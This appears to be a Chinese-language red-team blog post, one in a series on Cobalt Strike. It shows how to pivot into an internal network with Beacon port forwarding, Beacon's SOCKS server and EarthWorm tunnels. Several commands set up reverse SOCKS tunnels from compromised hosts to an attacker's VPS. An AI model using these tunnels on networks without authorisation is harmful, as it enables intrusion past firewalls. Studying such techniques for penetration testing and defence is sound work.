---
layout:     post
title:    Cobalt Strike系列 7
subtitle:   Cobalt Strike 代理转发隧道等有关内容
date:       2019-09-01
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 渗透测试
    - 红队
    - Cobalt Strike
---
# Cobalt Strike系列 7 代理转发隧道等有关内容  

## 简介  
- 端口转发  
- Socks概念  
- Cobalt Strike自带socks  
- EarthWorm搭建隧道  

## 端口转发  
Cobalt Strike中beacon自带了一个端口转发的命令，rportfwd。用法如下：  
```
rportfwd 本机端口 目标ip 目标端口  
```
具体的可以用命令查看帮助。  
```
beacon> help rportfwd
Use: rportfwd [bind port] [forward host] [forward port]
     rportfwd stop [bind port]

Binds the specified port on the target host. When a connection comes in,
Cobalt Strike will make a connection to the forwarded host/port and use Beacon
to relay traffic between the two connections.
```
但是方便归方便，实际上用起来有点慢，远不如其他的成熟的工具。  


##  Socks概念
目前利用网络防火墙将内外网隔离开来，是很常见的方式。这些防火墙系统通常以应用层网关的形式工作在网络之间，提供受控的 TELNET 、 FTP 、 SMTP 等的接入。 SOCKS 提供一个通用框架来使这些协议安全透明地穿过防火墙。  
利用socks技术，可以用来穿透目标内网，进行进一步的内网渗透。  

## Cobalt Strike自带的socks  
右键选择一个目标，中转里面有这个选项，根据配置填好就可以，注意端口通行。  
![cssocks](/img/cssocks.png)  
![cssocks2](/img/cssocks2.png)  
也可以用beacon命令进行配置。  
```
beacon> help socks
Use: socks [stop|port]

Starts a SOCKS4a server on the specified port. This server will relay 
connections through this Beacon. 

Use socks stop to stop the SOCKS4a server and terminate existing connections.

Traffic will not relay while Beacon is asleep. Change the sleep time with the
sleep command to reduce latency.
```
然后配合proxychains等代理工具挂上代理。  

## EarthWorm搭建隧道  
使用ew来作为内网穿透，支持多个平台，稳定，应用广。  
简单构建几个场景来作为演示案例。  
ew的常用参数：  
```
 ./xxx ([-options] [values])*
 options :
 Eg: ./xxx -s ssocksd -h 
 -s 该选项指定你需要使用的功能模块，以下6项内容中选择一项：
  ssocksd , rcsocks , rssocks , 
 lcx_listen , lcx_tran , lcx_slave
 -l 该命令为服务启动开启指定端口
 -d 指定转发或反弹的主机地址
 -e 指定转发或反弹的主机端口
 -f 指定连接或映射的主机地址
 -g 指定连接或映射的主机端口
 -h 打开帮助提示，当与-s参数共同使用时可以看到更详细的内容
 -a 关于
 -v 显示版本 
 -t usectime set the milliseconds for timeout. The default 
 value is 1000 
 ......
```
### 正向代理socks  
适用于目标机器有公网ip的情况，在服务器上部署ew，并且执行：  
```
./ew -s ssocksd -l 1080  
```
开启服务器1080端口，用对应代理工具连接就可以作为正向代理进入对方内网了。  
### 一层反向代理  
适用于机器没有公网IP，但是能访问公网与内网资源。  
VPS执行命令：  
```
ew -s rcsocks -l 1008 -e 888
```
VPS开启1008端口，转发888端口流量。  
服务器端执行命令：  
```
ew -s rssocks -d vps ip -e 888
```
开启socks5服务，反弹到vps的888端口上。   

### 二层转发
一般也不多见，构建情景如下：  
现内网有两台主机分别为A，B。  
其中A可以访问外网，但是不能访问内网资源，与B可以通讯。  
B在内网，可以访问内网资源，但是不能访问外网。   
首先在利用A将ew上传到B上，然后A与外网VPS上也布上ew。
```  
VPS上执行命令：  
ew -s lcx_listen -l 1080 -e 888  
然后在B上开启ew：
ew -s ssocks -l 999
然后在A上开启ew：  
ew -s lcx_slave -d vps ip -e 888 -f B ip -g 999
```
然后自己的电脑通过，访问vps的1080端口就可以使用在B上架的socks5服务器，访问内网资源。  
### 总结
还有一些情况在实际中碰到的不多，就不列举了，工具也不是仅限于文章中的ew等，根据实际情况进行选择。  
